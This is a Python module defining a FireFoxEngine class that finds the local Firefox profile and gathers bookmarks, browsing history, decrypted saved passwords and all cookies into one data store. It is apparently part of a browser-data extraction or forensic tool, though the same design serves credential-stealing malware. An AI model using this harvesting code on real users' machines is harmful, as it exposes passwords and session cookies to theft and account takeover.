import firefoxHistory
import firefox_bookmarks
import firepwd
import firefox_cookie
import os
import threading
import usefull_things as ut
import datetime
import erros as err

class FireFoxEngine():
    def __init__(self):
        self.name = "firefox"
        firefox_path = os.path.expanduser('~') + "\AppData\Roaming\Mozilla\Firefox\Profiles\\"
        if not ut.file_exists(firefox_path):
            self.is_valid = False
        else:
            self.is_valid = True
        if self.is_valid:
            self.info_bank = {}

    def get_bookmarks(self):
        info = firefox_bookmarks.bookmarks()
        if info[0] == 'err':
            err.error_handle(info[1:], self.name)
        else:
            self.info_bank['bookmarks'] = info[0]
            return info[0]

    def get_history(self):
        info = firefoxHistory.history()
        if info[0] == 'err':
            err.error_handle(info[1:], self.name)
        else:
            self.info_bank['history'] = info[0]
            return info[0]

    def get_saved_password(self):
        info = firepwd.get_saved_password()
        if info[0] == 'err':
            err.error_handle(info[1:], self.name)
        else:
            self.info_bank['passwords'] = info
            return info

    def get_cookies(self):
        info = firefox_cookie.get_all_cookies()
        if info[0] == 'err':
            err.error_handle(info[1:], self.name)
        else:
            self.info_bank['cookies'] = info[0]
            return info[0]